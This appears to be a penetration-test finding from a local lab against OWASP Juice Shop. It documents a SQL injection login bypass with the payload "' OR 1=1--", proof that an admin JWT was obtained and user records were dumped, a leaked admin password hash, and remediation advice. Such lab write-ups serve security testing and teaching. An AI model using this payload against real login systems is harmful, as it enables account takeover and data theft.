# c03-sqli-admin — SQL injection on login → admin authentication

**Target:** http://host.docker.internal:3000 (OWASP Juice Shop, local lab)
**Endpoint:** `POST /rest/user/login`
**Impact:** Authentication bypass → full admin session, no credentials required

## Root cause
The `email` field of the JSON login body is interpolated into the SQL lookup
rather than bound as a parameter:

    SELECT * FROM Users WHERE email = '<email>' AND password = '<md5(password)>'
                                        ^^^^^^^^ injectable

## Exploit
    POST /rest/user/login
    Content-Type: application/json

    {"email": "' OR 1=1--", "password": "irrelevant"}

`' OR 1=1--` closes the string literal, makes the WHERE clause unconditionally
true and comments out the password predicate. The query returns the **first row**
of `Users`, which is `id=1 / admin@juice-sh.op`; the app signs a JWT for that row.

## Proof — reproduced end-to-end with `pocs/c3_sqli_admin_login.py`
| Check | Result |
|---|---|
| bad creds baseline | HTTP 401 `Invalid email or password.` |
| injected login | HTTP 200 + JWT |
| JWT alg | RS256 |
| JWT claims | `id=1, email=admin@juice-sh.op, role=admin` |
| `GET /rest/user/whoami` (Bearer) | HTTP 200 `{"user":{"id":1,"email":"admin@juice-sh.op",...}}` |
| `GET /api/Users/` with Bearer token | HTTP 200 → **23 user records dumped** (admin-only endpoint) |
| `GET /api/Users/` with no token (negative control) | HTTP 401 `UnauthorizedError: No Authorization header was found` |
| `GET /api/Users/` with `Cookie: token=` only | HTTP 401 — **cookie alone is insufficient**, Bearer header required |

## Loot
- `evidence/c3_admin_token.txt` — admin JWT, 717 chars + newline (`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...`)
- Token payload also leaks the admin password hash `0192023a7bbd73250516f069df18b500`
  (md5 of `admin123`) — extra data exposure from embedding the hash in the JWT.
- PoC: `pocs/c3_sqli_admin_login.py` (verifies claims + asserts `role == "admin"` before saving)

## Remediation
1. Use parameterised queries / an ORM with bound parameters for the login lookup;
   never build SQL by string concatenation.
2. Stop embedding the password hash (and other sensitive columns) in the issued
   JWT payload — return only an opaque ID and look up the user server-side.
3. Rate-limit / lock out repeated failed logins to make blind exploitation harder.
